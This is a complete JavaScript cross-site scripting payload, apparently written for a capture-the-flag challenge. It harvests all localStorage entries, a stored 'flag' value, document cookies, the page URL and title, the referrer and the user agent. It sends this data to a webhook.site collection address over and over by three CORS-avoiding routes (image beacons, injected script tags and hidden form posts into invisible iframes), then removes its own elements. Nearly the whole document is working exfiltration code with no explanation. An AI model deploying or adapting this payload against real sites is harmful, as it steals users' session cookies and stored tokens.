     console.log('🎯 PAYLOAD LOADED - CORS-Free Flag Extraction');

     // CORS-FREE METHODS FOR DATA EXFILTRATION
     function sendViaImage(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ?
     JSON.stringify(data[key]) : data[key]);
             });
             img.src =
     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/img?' +
     params.toString();
             document.body.appendChild(img);
             console.log('📸 Image exfiltration sent');
         } catch(e) { console.error('Image method failed:', e); }
     }

     function sendViaScript(data) {
         try {
             const script = document.createElement('script');
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ?
     JSON.stringify(data[key]) : data[key]);
             });
             script.src =
     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/script?' +
     params.toString() + '&callback=handleWebhookResponse';
             document.head.appendChild(script);
             console.log('📜 Script exfiltration sent');
         } catch(e) { console.error('Script method failed:', e); }
     }

     function sendViaForm(data) {
         try {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action =
     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
             form.target = 'webhook_frame_' + Date.now();
             form.style.display = 'none';

             // Create hidden iframe for form target
             const iframe = document.createElement('iframe');
             iframe.name = form.target;
             iframe.style.display = 'none';
             document.body.appendChild(iframe);

             // Add all data as form fields
             Object.keys(data).forEach(key => {
                 const input = document.createElement('input');
                 input.type = 'hidden';
                 input.name = key;
                 input.value = typeof data[key] === 'object' ?
     JSON.stringify(data[key]) : data[key];
                 form.appendChild(input);
             });

             document.body.appendChild(form);
             form.submit();
             console.log('📋 Form exfiltration sent');

             // Clean up after a delay
             setTimeout(() => {
                 if (form.parentNode) form.parentNode.removeChild(form);
                 if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
             }, 5000);
         } catch(e) { console.error('Form method failed:', e); }
     }

     // Send payload start confirmation
     const startData = {
         status: 'PAYLOAD_EXECUTION_START',
         timestamp: new Date().toISOString(),
         url: window.location.href,
         domain: window.location.hostname,
         userAgent: navigator.userAgent
     };

     sendViaImage(startData);
     sendViaScript(startData);
     sendViaForm(startData);

     // Main flag extraction logic
     try {
         console.log('🔍 Searching for flag in localStorage...');

         // Extract all localStorage data
         const allStorage = {};
         const storageKeys = [];

         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
             allStorage[key] = value;
             storageKeys.push(key);
             console.log(`Found localStorage key: ${key} = ${value}`);
         }

         // Try to find the flag
         const flag = localStorage.getItem('flag');
         const flagFound = !!flag;

         console.log(`Flag found: ${flagFound}`);
         if (flag) {
             console.log(`🚩 FLAG CAPTURED: ${flag}`);
         }

         // Prepare comprehensive data package
         const flagData = {
             status: 'FLAG_EXTRACTION_COMPLETE',
             timestamp: new Date().toISOString(),
             success: flagFound,
             flag: flag || 'not_found',
             all_localStorage: JSON.stringify(allStorage),
             localStorage_keys: storageKeys.join(','),
             page_url: window.location.href,
             page_domain: window.location.hostname,
             page_title: document.title,
             cookies: document.cookie || 'none',
             referrer: document.referrer || 'none',
             user_agent: navigator.userAgent
         };

         console.log('📤 Sending flag data via all methods...');

         // Send via all CORS-free methods
         sendViaImage(flagData);
         sendViaScript(flagData);
         sendViaForm(flagData);

         // If flag found, send additional confirmations
         if (flag) {
             const flagConfirmData = {
                 status: 'FLAG_CONFIRMED',
                 flag: flag,
                 timestamp: new Date().toISOString(),
                 extraction_method: 'localStorage'
             };

             // Multiple confirmations with different approaches
             setTimeout(() => sendViaImage(flagConfirmData), 1000);
             setTimeout(() => sendViaScript(flagConfirmData), 1500);
             setTimeout(() => sendViaForm(flagConfirmData), 2000);

             // Create a visible element with the flag (for debugging)
             const flagDiv = document.createElement('div');
             flagDiv.style.cssText =
     'position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;';
             flagDiv.innerHTML = `<!-- FLAG: ${flag} -->`;
             document.body.appendChild(flagDiv);
         }

         // Send final completion status
         setTimeout(() => {
             const completionData = {
                 status: 'PAYLOAD_EXECUTION_COMPLETE',
                 timestamp: new Date().toISOString(),
                 flag_captured: flagFound,
                 methods_attempted: 3,
                 total_localStorage_items: storageKeys.length
             };

             sendViaImage(completionData);
             sendViaScript(completionData);
             sendViaForm(completionData);
         }, 3000);

     } catch (error) {
         console.error('🚨 Payload execution error:', error);

         const errorData = {
             status: 'PAYLOAD_ERROR',
             error_message: error.message,
             error_stack: error.stack || 'no_stack',
             timestamp: new Date().toISOString()
         };

         sendViaImage(errorData);
         sendViaScript(errorData);
         sendViaForm(errorData);
     }

     // Global callback function for script method responses
     window.handleWebhookResponse = function(response) {
         console.log('Webhook response received:', response);
     };

     console.log('🏁 Payload script completed');
